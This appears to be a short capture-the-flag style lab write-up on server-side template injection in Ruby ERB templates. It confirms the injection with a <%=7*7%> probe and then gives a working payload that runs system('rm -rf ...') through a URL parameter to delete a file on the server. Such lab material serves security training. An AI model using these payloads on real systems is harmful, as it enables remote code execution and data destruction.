# Lab 1 : Basic ERB SSTI

## Decription
```
To solve the lab, review the ERB documentation to find out how to execute arbitrary code,
then delete the morale.txt file from Carlos's home directory. 
```
## Solution
* While visiting any product we create a request like   ``` /?productId=15```
* When we change the product id to "1" then we get an error message ```/?message="Unfortunately the product is out of stock"```
* We try something like ```/?message=<%=7*7%>``` (URL Encoded) and get "49" printed. Hence SSTI is confirmed
* To solve the lab we use the system() function in ruby. ```/?message=<%=system('rm -rf /home/carlos/morale.txt')%>``` (URL encoded)

